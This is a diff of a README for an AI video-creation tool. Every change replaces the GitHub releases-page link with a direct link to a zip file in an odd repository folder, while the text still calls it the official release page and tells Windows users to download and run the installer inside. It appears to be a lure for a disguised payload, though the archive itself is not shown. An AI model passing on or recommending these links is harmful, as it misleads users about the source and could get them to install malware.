@@ -1,6 +1,6 @@
 # 🎬 ai-video-generation-workflow - Easy AI Video Creation Steps
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip)
 
 ## 📄 What is ai-video-generation-workflow?
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these requirements:
 Follow these steps to download and run the application on your Windows computer:
 
 1. Click the green button at the top labeled **Download Release** or visit the release page here:  
-   [https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+   [https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip](https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip)
 
 2. On the release page, look for the latest version. Download the file named similar to `ai-video-generation-workflow-setup.exe` or a `.zip` archive.
 
@@ -70,7 +70,7 @@ Save your video file in MP4 format. You can share it on social media or upload i
 
 You must download the software from the official GitHub release page:
 
-[https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+[https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip](https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip)
 
 Look for the latest version available. The release page will have assets with the setup file or zipped program folder.
 
@@ -131,7 +131,7 @@ If the audio or video does not play or export properly:
 
 To update:
 
-1. Visit [https://github.com/cronux-ind/ai-video-generation-workflow/releases](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+1. Visit [https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip](https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip)
 2. Download the latest release.
 3. Run the new installer or extract the new version.
 4. Your previous projects and saved scripts remain safe in their folders.
@@ -162,4 +162,4 @@ This repository uses tools and concepts related to:
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cronux-ind/ai-video-generation-workflow/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cronux-ind/ai-video-generation-workflow/main/content/topics/video_workflow_generation_ai_3.1.zip)
